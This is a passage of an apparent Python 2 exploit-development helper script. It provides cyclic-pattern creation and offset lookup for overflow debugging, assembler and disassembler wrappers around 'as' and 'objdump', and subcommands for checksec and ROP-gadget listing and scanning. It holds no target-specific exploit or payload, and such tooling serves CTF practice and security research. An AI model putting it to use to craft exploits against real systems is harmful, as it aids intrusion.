    def generate(self):
        for x in xrange(0x41, 0x5b):
            for y in xrange(0x61, 0x7b):
                for z in xrange(0x30, 0x3a):
                    yield "%c%c%c" % (x, y, z)

    @classmethod
    def create(cls, size):
        s = ''
        for x in cls.generate():
            s += x
            if len(s) >= size:
                return s[:size]
        else:
            raise Exception("size too large")

    @classmethod
    def offset(cls, s):
        m = re.search(r'^(?:[0-9A-F]+|[0-9a-f]+)$', s)
        if m:
            addr = int(s, 16)
            if addr >> 32:
                chunk = p64(addr)
            else:
                chunk = p32(addr)
        else:
            chunk = s

        buf = ''
        for x in cls.generate():
            buf += x
            if chunk in buf:
                return buf.index(chunk)
        else:
            raise Exception("pattern not found")


class Asm:
    @classmethod
    def assemble(cls, s, arch):
        if arch == 'i386':
            option = '--32'
        elif arch == 'x86-64':
            option = '--64'
        else:
            raise Exception('unsupported architecture')

        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.flush()
            p = Popen(['as', option, '--msyntax=intel', '--mnaked-reg', '-o', f.name], stdin=PIPE, stdout=PIPE, stderr=PIPE)
            stdout, stderr = p.communicate(s+'\n')
            if stderr:
                sys.stderr.write(stderr)
                return
            p = Popen(['objdump', '-w', '-M', 'intel', '-d', f.name], stdout=PIPE)
            stdout, stderr = p.communicate()
            for line in stdout.splitlines()[7:]:
                print line
            os.remove(f.name)

    @classmethod
    def disassemble(cls, blob, arch):
        if arch == 'i386':
            (machine, options) = ('i386', 'intel')
        elif arch == 'x86-64':
            (machine, options) = ('i386', 'intel,x86-64')
        else:
            raise Exception('unsupported architecture')

        with tempfile.NamedTemporaryFile() as f:
            f.write(blob)
            f.flush()
            p = Popen(['objdump', '-w', '-b', 'binary', '-m', machine, '-M', options, '-D', f.name], stdout=PIPE)
            stdout, stderr = p.communicate()
            for line in stdout.splitlines()[7:]:
                print line


if __name__ == '__main__':
    fmt_usage = "Usage: python %s [checksec|create|offset|gadget|scan|asm] ..."

    if len(sys.argv) < 2:
        print >>sys.stderr, fmt_usage % sys.argv[0]
        sys.exit(1)
    cmd = sys.argv[1]

    if cmd == 'checksec':
        fpath = sys.argv[2] if len(sys.argv) > 2 else 'a.out'
        ELF(fpath).checksec()
    elif cmd == 'create':
        size = int(sys.argv[2]) if len(sys.argv) > 2 else 200
        print Pattern.create(size)
    elif cmd == 'offset':
        if len(sys.argv) < 3:
            print >>sys.stderr, "Usage: python %s offset [ADDRESS|STRING]" % sys.argv[0]
            sys.exit(1)
        print Pattern.offset(sys.argv[2])
    elif cmd == 'gadget':
        fpath = sys.argv[2] if len(sys.argv) > 2 else 'a.out'
        ELF(fpath).list_gadgets()
    elif cmd == 'scan':
        if len(sys.argv) < 3:
            print >>sys.stderr, "Usage: python %s scan HEX_LIST [FILE]" % sys.argv[0]
            sys.exit(1)
        chunk = sys.argv[2].replace(' ', '').decode('hex')
        fpath = sys.argv[3] if len(sys.argv) > 3 else 'a.out'
        ELF(fpath).scan_gadgets(chunk)
    elif cmd == 'asm':
        if len(sys.argv) > 2 and sys.argv[2] == '-d':
            arch = sys.argv[3] if len(sys.argv) > 3 else 'i386'
            data = sys.stdin.read()
            if re.search(r'^[\s0-9A-Fa-f]*$', data):
                data = ''.join(data.split()).decode('hex')
            Asm.disassemble(data, arch)
        else:
            arch = sys.argv[2] if len(sys.argv) > 2 else 'i386'
            data = sys.stdin.read()
            Asm.assemble(data, arch)
    else:
        print >>sys.stderr, fmt_usage % sys.argv[0]
        sys.exit(1)
